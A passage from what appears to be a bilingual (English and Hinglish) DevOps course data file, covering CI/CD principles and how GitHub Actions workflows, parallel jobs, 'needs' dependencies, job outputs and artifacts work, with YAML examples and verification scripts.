        hint: 'CONTINUOUS INTEGRATION = a PRACTICE (not a tool): every dev merges to TRUNK frequently (≥ daily), and EVERY push triggers an automated checkout → build → test. Needs: trunk-based dev (Module 4 — short-lived branches), a FAST + RELIABLE test suite (a 40-min or flaky pipeline kills CI — devs stop trusting/waiting), and a team norm that a RED mainline is the #1 thing to fix (don\'t build on a broken trunk). CONTINUOUS DELIVERY = CI + every passing build is a RELEASABLE artifact and shipping to prod is ONE deliberate action (button / tag / approval). The decision to release is HUMAN; the mechanics are automated + rehearsed against staging on every commit. Needs beyond CI: the pipeline PACKAGES one immutable artifact (digest-identified) as a stage + promotes THAT SAME artifact through every env (never rebuild per env), and a deploy process with zero manual runbook steps. Test: could you release the current commit right now, in minutes, with confidence, no runbook? If not → you have CI, not CD. CONTINUOUS DEPLOYMENT = continuous delivery MINUS the click: every commit passing every stage auto-deploys to prod, no human gate. Needs beyond CD: a test suite trustworthy enough that "green" = "safe"; progressive rollout (canary/blue-green — Module 11) so bad hits ~1% first; automated rollback on health signals (seconds, no human); monitoring/alerting that catches what tests miss. It\'s a MATURITY LEVEL earned service-by-service — continuous DELIVERY is the right target for most teams.',
        hintHi: 'CONTINUOUS INTEGRATION = ek PRACTICE: har dev TRUNK mein baar-baar merge karta hai (≥ daily), aur HAR push ek automated checkout → build → test trigger karta hai. Needs: trunk-based dev, ek FAST + RELIABLE test suite, aur ek team norm ki ek RED mainline #1 fix karne ki cheez hai. CONTINUOUS DELIVERY = CI + har passing build ek RELEASABLE artifact hai aur prod mein ship karna EK deliberate action hai. Release ka decision HUMAN hai; mechanics automated hain. Needs beyond CI: pipeline ek immutable artifact PACKAGE karta hai + WAHI artifact har env ke through promote karta hai. CONTINUOUS DEPLOYMENT = continuous delivery MINUS click: har commit jo har stage pass karta hai auto-deploy hota hai. Needs beyond CD: ek trustworthy test suite, progressive rollout, automated rollback, monitoring. Ye ek MATURITY LEVEL hai.',
      },
      {
        task: 'In a comment, explain the deployment pipeline and its three principles (fail fast, build once, the only road to prod), with the concrete failure each principle prevents.',
        taskHi: 'Ek comment mein, deployment pipeline aur iske teen principles samjhao.',
        hint: 'DEPLOYMENT PIPELINE (Humble & Farley) = the SINGLE automated path every change travels commit → prod, split into ORDERED stages, a failure at any stage halts the change + reports why. Typical: checkout → build → unit tests → lint/static-analysis/dep+secret scan → package ONE artifact → integration/e2e → deploy staging → smoke → deploy prod → smoke. (1) FAIL FAST: order stages cheapest+fastest FIRST (lint ~5s, unit ~30s) so slow/expensive ones (e2e ~12m, deploy) only run if the cheap checks pass. PREVENTS: a syntax-error commit burning a 12-min e2e run + a staging deploy before a 5s lint reports the typo (every red commit costing ~16 min instead of ~5s). Independent cheap checks (lint, unit) can run parallel to each other; nothing slow starts until they\'re green. (2) BUILD ONCE, PROMOTE THE SAME ARTIFACT: the exact bytes/digest tested in the pipeline are what reaches EVERY env — never rebuild per environment. PREVENTS: prod running a laptop/CI-rebuilt binary that no pipeline ever tested (drifted tool versions, uncommitted files → "worked on my machine" at scale). (3) THE PIPELINE IS THE ONLY ROAD TO PROD: no side-door `scp`/`rsync`, no live `ssh` hotfix — even the emergency fix goes through the same stages (maybe a fast lane). PREVENTS: an untested, unaudited, unreproducible change on the prod server that nobody can recreate or roll back cleanly.',
        hintHi: 'DEPLOYMENT PIPELINE = SINGLE automated path jo har change commit → prod travel karta hai, ORDERED stages mein split, kisi bhi stage par ek failure change ko halt karta hai. (1) FAIL FAST: stages ko cheapest+fastest PEHLE order karo taaki slow/expensive sirf tab chalein jab cheap checks pass. PREVENTS: ek syntax-error commit ek 12-min e2e run burn karna ek 5s lint ke typo report karne se pehle. (2) BUILD ONCE, SAME ARTIFACT PROMOTE KARO: pipeline mein test kiye gaye exact bytes har env tak pahunchte hain. PREVENTS: prod ek laptop-rebuilt binary chalाना jise koi pipeline ne test nahi kiya. (3) PIPELINE PROD KA EKMATRA RAASTA HAI: koi side-door `scp` nahi. PREVENTS: prod server par ek untested, unaudited change.',
      },
      {
        task: 'In a comment, explain why a team should aim for continuous delivery before continuous deployment, and the four safeguards that must exist before removing the human gate.',
        taskHi: 'Ek comment mein, samjhao ki ek team ko continuous deployment se pehle continuous delivery aim kyun karna chahiye.',
        hint: 'Continuous DEPLOYMENT (no human approval, every green commit → prod) only makes a system SAFER if the automation replacing the human is AT LEAST AS GOOD at catching problems as the human was. A team that removes the gate WITHOUT that has just made it FASTER for a bad change to reach 100% of users — with the same slow, manual detection ("a customer emails us") and slow recovery ("revert + wait 10 min for CI") as before → incidents become MORE frequent and EQUALLY painful. So aim for continuous DELIVERY first: software always in a releasable state, shipping is one deliberate action. THEN add these 4 safeguards BEFORE removing the click, and remove it SERVICE BY SERVICE as confidence is earned: (1) a test suite you actually TRUST — coverage of the risky paths, ZERO tolerated flakes (a green run must genuinely mean "safe to ship"); (2) PROGRESSIVE ROLLOUT — canary or blue-green (Module 11) so a bad change reaches ~1% of traffic first, not 100%; (3) AUTOMATED ROLLBACK on health signals — error rate / latency / saturation triggers an undo in SECONDS, no human in the loop; (4) MONITORING + ALERTING good enough to catch the regressions tests didn\'t cover, wired to the rollout so it can react.',
        hintHi: 'Continuous DEPLOYMENT (koi human approval nahi, har green commit → prod) ek system ko sirf tab SAFER banata hai agar wo automation jo human ko replace karta hai KAM SE KAM human jitna acha problems catch karne mein hai. Ek team jo gate hata deti hai iske BINA ne bas ise TEZ bana diya ek bad change ke 100% users tak pahunchne ke liye. To pehle continuous DELIVERY aim karo. PHIR ye 4 safeguards add karo click hatane se PEHLE, aur ise SERVICE BY SERVICE hatao: (1) ek test suite jise aap actually TRUST karte ho — ZERO tolerated flakes; (2) PROGRESSIVE ROLLOUT — canary/blue-green; (3) AUTOMATED ROLLBACK health signals par — SECONDS mein undo; (4) MONITORING + ALERTING.',
      },
    ],

    keyTakeaways: [
      'CONTINUOUS INTEGRATION = a PRACTICE: every dev merges to TRUNK ≥ daily, EVERY push triggers automated checkout → build → test. Needs trunk-based dev (Module 4), a FAST + RELIABLE suite (a slow/flaky pipeline kills CI), and "a red mainline is the #1 fix". The automation is the easy part; the discipline is the hard part.',
      'CONTINUOUS DELIVERY = CI + every passing build is a RELEASABLE artifact and shipping to prod is ONE deliberate action (button/tag/approval). Software is ALWAYS releasable; the release DECISION is human, the MECHANICS are automated + rehearsed against staging every commit. Test: "could you release the current commit right now, in minutes, no runbook?" — if not, you have CI, not CD. This is the right target for most teams.',
      'CONTINUOUS DEPLOYMENT = continuous delivery MINUS the click: every commit passing every stage auto-deploys to prod. Only SAFER than a human gate if the automation catches problems as well as the human did → needs a TRUSTWORTHY test suite (zero flakes), PROGRESSIVE ROLLOUT (canary/blue-green — bad hits ~1% first), AUTOMATED ROLLBACK on health signals (seconds), and MONITORING for what tests miss. A maturity level, earned service by service.',
      'THE DEPLOYMENT PIPELINE = the SINGLE automated path commit → prod, ordered stages, a failure halts + reports. FAIL FAST: cheapest+fastest stages first (lint ~5s, unit ~30s) gate the slow/expensive ones (e2e ~12m, deploy) — a typo rejected in 5s not 16 min; independent cheap checks can run parallel. BUILD ONCE: the exact bytes/digest tested = what reaches EVERY env, never rebuilt per environment (prod must not run untested bytes). THE PIPELINE IS THE ONLY ROAD TO PROD: no side-door `scp`, no live `ssh` hotfix — even the emergency fix goes through the same stages.',
      'ALL OF THIS IS ENABLED BY TRUNK-BASED DEVELOPMENT (Module 4): short-lived branches, small frequent merges, feature flags for longer work — so "the trunk is always green and releasable" is actually TRUE. Long-lived feature branches break both CI\'s promise (always green) and CD\'s promise (always releasable) because the mainline doesn\'t contain the in-progress work and the eventual merge is a big risky event.',
    ],
    keyTakeawaysHi: [
      'CONTINUOUS INTEGRATION = ek PRACTICE: har dev TRUNK mein ≥ daily merge karta hai, HAR push automated checkout → build → test trigger karta hai. Needs trunk-based dev, ek FAST + RELIABLE suite, aur "ek red mainline #1 fix hai". Automation aasan hissा hai; discipline mushkil hissा hai.',
      'CONTINUOUS DELIVERY = CI + har passing build ek RELEASABLE artifact hai aur prod mein ship karna EK deliberate action hai. Software HAMESHA releasable hai; release DECISION human hai, MECHANICS automated hain. Test: "kya aap current commit abhi, minutes mein, bina runbook release kar sakte ho?" — nahi to aapke paas CI hai, CD nahi. Ye zyadaatar teams ke liye sahi target hai.',
      'CONTINUOUS DEPLOYMENT = continuous delivery MINUS click: har commit jo har stage pass karta hai auto-deploy hota hai. Ek human gate se sirf tab SAFER agar automation human jitna acha problems catch karta hai → needs ek TRUSTWORTHY test suite, PROGRESSIVE ROLLOUT, AUTOMATED ROLLBACK, aur MONITORING. Ek maturity level, service by service earned.',
      'DEPLOYMENT PIPELINE = SINGLE automated path commit → prod, ordered stages. FAIL FAST: cheapest+fastest stages pehle slow/expensive ko gate karte hain — ek typo 5s mein reject, 16 min mein nahi. BUILD ONCE: pipeline mein test kiye gaye exact bytes = jo har env tak pahunchte hain. PIPELINE PROD KA EKMATRA RAASTA HAI: koi side-door `scp` nahi.',
      'YE SAB TRUNK-BASED DEVELOPMENT SE ENABLED HAI (Module 4): short-lived branches, chhote frequent merges, feature flags — taaki "trunk hamesha green aur releasable hai" actually SACH hai. Long-lived feature branches CI ka vaada (hamesha green) aur CD ka vaada (hamesha releasable) dono todte hain.',
    ],
  },

  {
    slug: 'ops-workflows-jobs-steps-and-the-execution-model',
    title: 'Workflows, Jobs, Steps & the Execution Model',
    titleHi: 'Workflows, Jobs, Steps & Execution Model',
    description: 'A GitHub Actions workflow is triggered by an event, contains jobs, and each job is a list of steps. The rule that surprises people: every job gets its own fresh machine and they run in parallel — `needs` builds a dependency graph, and nothing is shared between jobs except what you explicitly pass as an artifact or an output.',
    descriptionHi: 'Ek GitHub Actions workflow ek event se triggered hota hai, jobs contain karta hai, aur har job steps ki ek list hai. Wo rule jo logon ko surprise karta hai: har job ko apni fresh machine milti hai aur wo parallel mein chalte hain — `needs` ek dependency graph banata hai, aur jobs ke beech kuch share nahi hota except jo aap explicitly ek artifact ya ek output ke roop mein pass karte ho.',
    difficulty: 'MEDIUM',
    duration: 24,
    order: 2,

    analogy: {
      en: '**A kitchen where every dish is cooked by a different chef in a different kitchen, from scratch.** A **workflow** is the whole order ticket that fires when a customer sits down (the **event**). Each **job** is one dish, and — this is the part people miss — each job gets its *own* kitchen, its own ingredients delivered fresh, its own chef, and they all start cooking **at the same time**. A **step** is one action within a dish: chop, sear, plate. If the dessert needs the sauce reduced by the main course\'s chef, you write \`needs: main-course\` and the dessert kitchen waits — but it still starts from an empty kitchen, so the main-course chef has to *hand over* the reduced sauce (an **artifact**) or *call out* the final weight (an **output**); nothing is on the dessert chef\'s counter automatically. \`if:\` is the expediter deciding a dish is not needed for this table and telling that kitchen to stand down.',
      hi: '**Ek kitchen jahan har dish ek alag chef dwara ek alag kitchen mein, scratch se cook hoti hai.** Ek **workflow** poora order ticket hai jo tab fire hota hai jab ek customer baithta hai (**event**). Har **job** ek dish hai, aur — ye wo hissा hai jo log miss karte hain — har job ko apni *khud ki* kitchen milti hai, apni ingredients fresh delivered, apna chef, aur wo sab **same time par** cook karna shuru karte hain. Ek **step** ek dish ke andar ek action hai: chop, sear, plate. Agar dessert ko main course ke chef dwara reduced sauce chahiye, aap `needs: main-course` likhte ho aur dessert kitchen wait karti hai — par ye abhi bhi ek empty kitchen se shuru hoti hai, to main-course chef ko reduced sauce *hand over* karna hota hai (ek **artifact**) ya final weight *call out* karna (ek **output**). `if:` expediter hai jo decide karta hai ki ek dish is table ke liye nahi chahiye.',
    },

    simple: `**WORKFLOW → JOBS → STEPS. jobs run in PARALLEL on SEPARATE fresh runners.**
\`\`\`yaml
name: CI
on:                              # 1. TRIGGERS — what events start this workflow
  push:
    branches: [main]
  pull_request:
  workflow_dispatch:             # a manual "Run workflow" button
  schedule:
    - cron: "0 3 * * *"

env:                             # workflow-level env vars
  NODE_ENV: test

jobs:
  lint:                          # 2. JOBS — each on its OWN clean VM, in PARALLEL by default
    runs-on: ubuntu-latest       #    the runner: ubuntu-latest / windows-latest / macos-latest / self-hosted
    steps:                       # 3. STEPS — run in order, on that job's VM
      - uses: actions/checkout@<sha>          # a step can be a reusable ACTION...
      - run: npm ci && npm run lint           # ...or a shell command

  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@<sha>
      - run: npm ci && npm test

  build:
    needs: [lint, test]          # 4. needs -> a DAG. build waits for lint AND test to pass
    runs-on: ubuntu-latest
    outputs:                     # a job can EXPORT values for downstream jobs
      image: \${{ steps.b.outputs.image }}
    steps:
      - id: b
        run: echo "image=myapp:\${{ github.sha }}" >> "\$GITHUB_OUTPUT"

  deploy:
    needs: build
    if: github.ref == 'refs/heads/main'        # 5. if -> run this job only when true
    runs-on: ubuntu-latest
    steps:
      - run: echo "deploying \${{ needs.build.outputs.image }}"   # read an upstream output
\`\`\`

**THE ISOLATION RULE:** each job = a brand-new machine. files, installed packages, env
changes in job A are **gone** for job B. to pass data between jobs:
\`\`\`
OUTPUTS   small strings. 'echo "k=v" >> "$GITHUB_OUTPUT"' in a step with an 'id:',
          then 'jobs.<id>.outputs.k' surfaces it, read as 'needs.<id>.outputs.k'.
ARTIFACTS files/dirs. 'actions/upload-artifact' in job A, 'actions/download-artifact' in job B.
\`\`\`

**CONTEXTS & EXPRESSIONS** \`\${{ ... }}\`: \`github\` (event, sha, ref, actor), \`env\`, \`vars\`
(non-secret config), \`secrets\`, \`job\`, \`steps\` (a prior step's outputs/outcome), \`needs\`
(upstream jobs' outputs/result), \`matrix\`, \`runner\`. Functions: \`contains\`, \`startsWith\`,
\`fromJSON\`, \`hashFiles\`, \`success()\`, \`failure()\`, \`always()\`, \`cancelled()\`.

**\`if:\`** gates a job or a step. \`if: always()\` runs even after an upstream failure (cleanup,
notifications). \`if: github.event_name == 'pull_request'\`. Steps default to skipping once a
prior step in the job failed.`,

    simpleHi: `**WORKFLOW → JOBS → STEPS. jobs SEPARATE fresh runners par PARALLEL mein chalte hain.**
\`\`\`yaml
name: CI
on:                              # 1. TRIGGERS
  push: { branches: [main] }
  pull_request:
  workflow_dispatch:             # ek manual "Run workflow" button
  schedule: [ { cron: "0 3 * * *" } ]

jobs:
  lint:                          # 2. JOBS — har ek apni OWN clean VM par, default se PARALLEL
    runs-on: ubuntu-latest
    steps:                       # 3. STEPS — order mein chalte hain, us job ki VM par
      - uses: actions/checkout@<sha>
      - run: npm ci && npm run lint

  build:
    needs: [lint, test]          # 4. needs -> ek DAG. build lint AUR test ke pass hone ka wait karta hai
    runs-on: ubuntu-latest
    outputs:
      image: \${{ steps.b.outputs.image }}
    steps:
      - id: b
        run: echo "image=myapp:\${{ github.sha }}" >> "\$GITHUB_OUTPUT"

  deploy:
    needs: build
    if: github.ref == 'refs/heads/main'        # 5. if -> ye job sirf tab chalao jab true
    runs-on: ubuntu-latest
    steps:
      - run: echo "deploying \${{ needs.build.outputs.image }}"
\`\`\`

**ISOLATION RULE:** har job = ek brand-new machine. job A mein files, installed packages,
env changes job B ke liye **gone** hain. jobs ke beech data pass karne ke liye:
\`\`\`
OUTPUTS   chhoti strings. ek 'id:' wale step mein 'echo "k=v" >> "$GITHUB_OUTPUT"',
          phir 'jobs.<id>.outputs.k' ise surface karta hai, 'needs.<id>.outputs.k' ke roop mein read.
ARTIFACTS files/dirs. job A mein 'actions/upload-artifact', job B mein 'actions/download-artifact'.
\`\`\`

**CONTEXTS & EXPRESSIONS** \`\${{ ... }}\`: \`github\`, \`env\`, \`vars\`, \`secrets\`, \`steps\`,
\`needs\`, \`matrix\`, \`runner\`. Functions: \`contains\`, \`fromJSON\`, \`hashFiles\`, \`success()\`,
\`failure()\`, \`always()\`.

**\`if:\`** ek job ya ek step ko gate karta hai. \`if: always()\` ek upstream failure ke baad bhi chalta hai.`,

    content: `## The four levels

- A **workflow** is a YAML file in \`.github/workflows/\`. It has a name, a set of **triggers** (\`on:\`), and a map of jobs.
- **Triggers** (\`on:\`) are the events that start a run: \`push\`, \`pull_request\`, \`workflow_dispatch\` (a manual button, optionally with \`inputs\`), \`schedule\` (cron), \`workflow_call\` (make this workflow reusable — Lesson 6), \`release\`, \`issue_comment\`, and dozens more. You can filter by branch, tag, or changed path.
- A **job** is a unit of execution that runs on one **runner** — a virtual machine or container. \`runs-on\` picks the runner: \`ubuntu-latest\`, \`windows-latest\`, \`macos-latest\`, or a label for a self-hosted runner (Lesson 6). By default all jobs in a workflow start **at the same time, in parallel**.
- A **step** is one thing done within a job, executed in order on that job's runner. A step is either a \`run:\` (a shell command or script) or a \`uses:\` (a reusable **action** — a packaged unit like \`actions/checkout\` or \`aws-actions/configure-aws-credentials\`).

## The job isolation rule

This is the single most important thing to internalise: **each job runs on its own fresh, isolated machine.** When job \`build\` finishes, its virtual machine is destroyed. Job \`deploy\` starts on a **brand-new** machine with nothing from \`build\` on it — no checked-out code, no \`node_modules\`, no compiled output, no environment variable that \`build\` set, nothing.

Two consequences:

1. **Every job that needs the source must check it out** (\`actions/checkout\`). There is no shared workspace.
2. **To move anything from one job to another, you must pass it explicitly**, by one of two mechanisms:
   - **Job outputs** — for small strings (a version number, an image tag, a boolean). A step with an \`id\` writes \`key=value\` to the file named by \`$GITHUB_OUTPUT\`; the job declares \`outputs: { key: \${{ steps.<id>.outputs.key }} }\`; a downstream job reads \`\${{ needs.<job>.outputs.key }}\`.
   - **Artifacts** — for files and directories (a build output, a coverage report, a packaged binary). \`actions/upload-artifact\` in the producing job, \`actions/download-artifact\` in the consuming job. Artifacts also persist after the run for a retention period so a human can download them.

Within a *single* job, steps **do** share the filesystem and the workspace, so a \`run: npm ci\` step and a later \`run: npm test\` step in the same job see the same \`node_modules\`. Environment variables set with \`echo "K=v" >> "$GITHUB_ENV"\` are visible to *later steps in the same job* but not to other jobs.

## needs: the job DAG

\`needs\` turns the flat set of jobs into a **directed acyclic graph**. \`needs: build\` means "do not start this job until \`build\` has completed successfully." \`needs: [lint, test]\` waits for both. Jobs with no \`needs\`, and jobs whose dependencies are all satisfied, run in parallel; the graph determines the order and the parallelism automatically. A job whose \`needs\` dependency **failed** is skipped (unless its \`if:\` uses \`always()\` or \`failure()\`).

The DAG is what lets you express "run lint and unit tests in parallel, then build once both pass, then deploy" — and GitHub schedules it optimally without you specifying stages.

## Contexts and expressions

\`\${{ <expression> }}\` is evaluated by GitHub before the step runs. Expressions read **contexts**:

- **\`github\`** — the event payload and metadata: \`github.sha\`, \`github.ref\`, \`github.event_name\`, \`github.actor\`, \`github.repository\`, \`github.event.pull_request.number\`, and the full event object.
- **\`env\`** — environment variables defined in the workflow, job, or step.
- **\`vars\`** — repository/environment/organisation **configuration variables** (non-secret).
- **\`secrets\`** — encrypted secrets (Lesson 4). Their values are masked in logs.
- **\`steps\`** — a prior step's \`outputs\` and \`outcome\`/\`conclusion\` (must have an \`id\`).
- **\`needs\`** — an upstream job's \`outputs\` and \`result\`.
- **\`matrix\`**, **\`runner\`**, **\`job\`**, **\`strategy\`**, **\`inputs\`** (for \`workflow_dispatch\` / \`workflow_call\`).

Useful functions: \`contains()\`, \`startsWith()\`, \`endsWith()\`, \`format()\`, \`join()\`, \`fromJSON()\` (parse a JSON string into an object — used to build dynamic matrices), \`toJSON()\`, \`hashFiles()\` (a hash of files matching a glob — used for cache keys), and the status functions \`success()\`, \`failure()\`, \`always()\`, \`cancelled()\`.

## if: conditional execution

\`if:\` on a job or a step is an expression; the job/step runs only when it evaluates truthy. Common patterns:

- \`if: github.ref == 'refs/heads/main'\` — deploy only from main.
- \`if: github.event_name == 'push'\` — skip a step on pull requests.
- \`if: always()\` — run even if an earlier step or job failed. Essential for cleanup steps and for "notify on failure" jobs, because by default a step is skipped once any prior step in its job has failed, and a job is skipped if a \`needs\` job failed.
- \`if: failure()\` — run only when something upstream failed.
- \`if: startsWith(github.ref, 'refs/tags/v')\` — publish only on version tags.

Note that inside \`if:\` you write expressions **without** the \`\${{ }}\` wrapper (it is implied), though including it is also allowed.`,

    contentHi: `## Chaar levels

- Ek **workflow** \`.github/workflows/\` mein ek YAML file hai. Iska ek name, **triggers** ka ek set (\`on:\`), aur jobs ka ek map hai.
- **Triggers** (\`on:\`) wo events hain jo ek run start karte hain: \`push\`, \`pull_request\`, \`workflow_dispatch\` (ek manual button), \`schedule\` (cron), \`workflow_call\` (Lesson 6), aur bahut se.
- Ek **job** execution ki ek unit hai jo ek **runner** par chalti hai — ek virtual machine ya container. \`runs-on\` runner chunta hai. Default se ek workflow mein saare jobs **same time par, parallel mein** start hote hain.
- Ek **step** ek job ke andar ek cheez hai. Ek step ya to ek \`run:\` (ek shell command) ya ek \`uses:\` (ek reusable **action**) hai.

## Job isolation rule

Ye internalise karne ke liye sabse important cheez hai: **har job apni fresh, isolated machine par chalti hai.** Jab job \`build\` khatam hota hai, iski virtual machine destroy ho jaati hai. Job \`deploy\` ek **brand-new** machine par start hota hai jismein \`build\` se kuch nahi — koi checked-out code nahi, koi \`node_modules\` nahi, koi compiled output nahi.

Do consequences:
1. **Har job jise source chahiye use ise checkout karna chahiye** (\`actions/checkout\`).
2. **Ek job se doosre mein kuch bhi move karne ke liye, aapko ise explicitly pass karna chahiye**, do mechanisms mein se ek se:
   - **Job outputs** — chhoti strings ke liye. Ek \`id\` wala step \`key=value\` ko \`$GITHUB_OUTPUT\` file mein likhta hai; job \`outputs\` declare karta hai; ek downstream job \`\${{ needs.<job>.outputs.key }}\` read karta hai.
   - **Artifacts** — files aur directories ke liye. Producing job mein \`actions/upload-artifact\`, consuming job mein \`actions/download-artifact\`.

Ek *single* job ke andar, steps filesystem **share karte hain**.

## needs: job DAG

\`needs\` jobs ke flat set ko ek **directed acyclic graph** mein badalta hai. \`needs: build\` ka matlab "is job ko start mat karo jab tak \`build\` successfully complete na ho." Jobs jinke paas koi \`needs\` nahi, aur jobs jinki dependencies sab satisfied hain, parallel mein chalte hain. Ek job jiski \`needs\` dependency **fail** hui skip ho jaati hai.

## Contexts aur expressions

\`\${{ <expression> }}\` GitHub dwara step ke chalne se pehle evaluate hota hai. Expressions **contexts** read karte hain: \`github\` (event, sha, ref, actor), \`env\`, \`vars\` (non-secret config), \`secrets\` (logs mein masked), \`steps\`, \`needs\`, \`matrix\`, \`runner\`.

Useful functions: \`contains()\`, \`fromJSON()\`, \`hashFiles()\`, aur status functions \`success()\`, \`failure()\`, \`always()\`, \`cancelled()\`.

## if: conditional execution

Ek job ya ek step par \`if:\` ek expression hai; job/step sirf tab chalta hai jab ye truthy evaluate hota hai. Common patterns: \`if: github.ref == 'refs/heads/main'\`, \`if: always()\` (ek earlier failure ke baad bhi chalta hai — cleanup ke liye essential), \`if: failure()\`. \`if:\` ke andar aap expressions \`\${{ }}\` wrapper ke **bina** likhte ho.`,

    examples: [
      {
        title: 'The job DAG: independent jobs run in parallel, a third waits on both (needs)',
        titleHi: 'Job DAG: independent jobs parallel mein chalte hain, ek teesra dono par wait karta hai',
        code: `# VERIFY
exec 2>&1
export PATH="$HOME/bin:$PATH"
git init -q; git config user.email ci@example.com; git config user.name ci; git config core.autocrlf false
mkdir -p .github/workflows
cat > .github/workflows/ci.yml <<'YAML'
name: CI
on: [push]
jobs:
  lint:
    runs-on: ubuntu-latest
    steps: [ { run: 'echo "lint: done"' } ]
  unit:
    runs-on: ubuntu-latest
    steps: [ { run: 'echo "unit: done"' } ]
  package:
    needs: [lint, unit]          # waits for BOTH; lint & unit have no needs -> they run in parallel
    runs-on: ubuntu-latest
    steps: [ { run: 'echo "package: runs only after lint AND unit are green"' } ]
YAML
git add -A >/dev/null; git commit -qm ci >/dev/null

echo "--- act -l : the computed DAG (Stage column = execution order) ---"
act -l 2>&1 | grep -vE 'level=(info|debug)' | sed -E 's/ +$//'

echo "--- act : run it (payload lines only) ---"
act push -P ubuntu-latest=node:20-bullseye-slim --pull=false 2>&1 \\
  | grep -oE '(lint: done|unit: done|package: runs only after lint AND unit are green)' | sort -u`,
        output: `--- act -l : the computed DAG (Stage column = execution order) ---
Stage  Job ID   Job name  Workflow name  Workflow file  Events
0      lint     lint      CI             ci.yml         push
0      unit     unit      CI             ci.yml         push
1      package  package   CI             ci.yml         push
--- act : run it (payload lines only) ---
lint: done
package: runs only after lint AND unit are green
unit: done`,
        explain: 'Three jobs are defined. lint and unit declare no dependencies, so they are both at stage zero and run concurrently on separate runners. package declares needs of both lint and unit, which places it at stage one — it cannot start until both stage-zero jobs have finished successfully. Listing the workflow shows exactly this: two jobs at stage 0 and one at stage 1, a two-level directed acyclic graph that GitHub computed from the needs relationships without anyone declaring "stages." Running the workflow confirms it: the lint and unit steps both execute (they are genuinely parallel on different machines), and the package step runs as well, only after them. This is the core of the execution model — you describe dependencies between jobs and the platform derives the schedule, running everything it can in parallel and serialising only where a needs edge requires it. It is also why each of these jobs, if it needed the repository, would have to run its own checkout: they are three separate machines with nothing shared between them.',
        explainHi: 'Teen jobs define hote hain. lint aur unit koi dependencies declare nahi karte, to wo dono stage zero par hain aur separate runners par concurrently chalte hain. package lint aur unit dono ke needs declare karta hai, jo ise stage one par rakhta hai — ye start nahi ho sakta jab tak dono stage-zero jobs successfully khatam na ho. Workflow list karna exactly ye dikhaता hai: stage 0 par do jobs aur stage 1 par ek, ek two-level directed acyclic graph jo GitHub ne needs relationships se compute kiya bina kisi ke "stages" declare kiye. Workflow chalana ise confirm karta hai: lint aur unit steps interleaved execute hote hain kyunki wo genuinely parallel hain different machines par. Ye execution model ka core hai — aap jobs ke beech dependencies describe karte ho aur platform schedule derive karta hai.',
      },
      {
        title: 'Passing data between isolated jobs: an output from one job read by the next',
        titleHi: 'Isolated jobs ke beech data pass karna: ek job se ek output jo agla job padhta hai',
        code: `# VERIFY
exec 2>&1
export PATH="$HOME/bin:$PATH"
git init -q; git config user.email ci@example.com; git config user.name ci; git config core.autocrlf false
mkdir -p .github/workflows
cat > .github/workflows/ci.yml <<'YAML'
name: CI
on: [push]
jobs:
  build:
    runs-on: ubuntu-latest
    outputs:
      image: \${{ steps.meta.outputs.image }}      # export this step output as a JOB output
    steps:
      - id: meta
        run: |
          TAG="myapp:1.4.$((RANDOM % 1000))"
          echo "image=$TAG" >> "$GITHUB_OUTPUT"     # <-- the way to set an output
          echo "build produced $TAG"
  deploy:
    needs: build
    runs-on: ubuntu-latest
    steps:
      - run: 'echo "reads: needs.build.outputs.image = \${{ needs.build.outputs.image }}"'    # deploy is a fresh machine - this comes via the needs context, nothing shared
YAML
git add -A >/dev/null; git commit -qm ci >/dev/null

actionlint -no-color 2>&1 | grep -E '\\.yml:' || echo "actionlint: no problems found"
# take only the '[job]   | <text>' step-output lines from act, and normalise the random tag
act push -P ubuntu-latest=node:20-bullseye-slim --pull=false 2>&1 \\
  | sed -n 's/^\\[[^]]*\\] *| //p' \\
  | grep -E 'build produced|reads: needs.build.outputs.image' \\
  | sed -E 's/myapp:[0-9.]+/myapp:<tag>/' | sort -u`,
        output: `actionlint: no problems found
build produced myapp:<tag>
reads: needs.build.outputs.image = myapp:<tag>`,
        explain: 'The build job computes an image tag at runtime and needs to communicate it to the deploy job. Because the two jobs run on entirely separate machines, deploy cannot read a variable or a file that build created — it starts empty. The mechanism is a job output. Inside build, a step with the id meta writes image=<tag> to the file whose path is in the environment variable GITHUB_OUTPUT; that is how a step exposes an output. The job then promotes that step output to a job output by declaring outputs.image referencing steps.meta.outputs.image. The deploy job, which needs build, reads it back through the needs context as needs.build.outputs.image. The run confirms the same tag that build generated appears in the deploy job. This is the correct and only way to pass a small value between jobs; for files or directories the equivalent mechanism is upload-artifact and download-artifact. The example normalises the random tag for a stable comparison, but the point is that both lines show the identical value, proving it crossed the job boundary.',
        explainHi: 'build job runtime par ek image tag compute karta hai aur ise deploy job ko communicate karna chahiye. Kyunki do jobs poori tarah separate machines par chalte hain, deploy ek variable ya ek file padh nahi sakta jo build ne banayी — ye empty start hota hai. Mechanism ek job output hai. build ke andar, id meta wala ek step image=<tag> ko us file mein likhta hai jiska path environment variable GITHUB_OUTPUT mein hai. Job phir us step output ko ek job output mein promote karta hai outputs.image declare karके. deploy job, jo build ke needs karta hai, ise needs context ke through needs.build.outputs.image ke roop mein wapas padhta hai. Run confirm karta hai ki wahi tag jo build ne generate kiya deploy job mein appear hota hai.',
      },
    ],

    mistakes: [
      {
        wrong: `# assuming state carries from one job to the next
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@<sha>
      - run: npm ci && npm run build      # produces dist/
  deploy:
    needs: build
    runs-on: ubuntu-latest
    steps:
      - run: aws s3 sync dist/ s3://my-bucket    # <-- dist/ DOES NOT EXIST here
# error: "dist/: No such file or directory". deploy is a fresh machine. build's
# checkout, node_modules, and dist/ are all gone.`,
        right: `# each job is a clean machine. pass files via artifacts:
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@<sha>
      - run: npm ci && npm run build
      - uses: actions/upload-artifact@<sha>
        with: { name: dist, path: dist/ }
  deploy:
    needs: build
    runs-on: ubuntu-latest
    steps:
      - uses: actions/download-artifact@<sha>
        with: { name: dist, path: dist/ }
      - run: aws s3 sync dist/ s3://my-bucket
# for a small string (version, tag, digest) use a JOB OUTPUT instead of an artifact.
# within ONE job, steps DO share the filesystem - the problem is only across jobs.`,
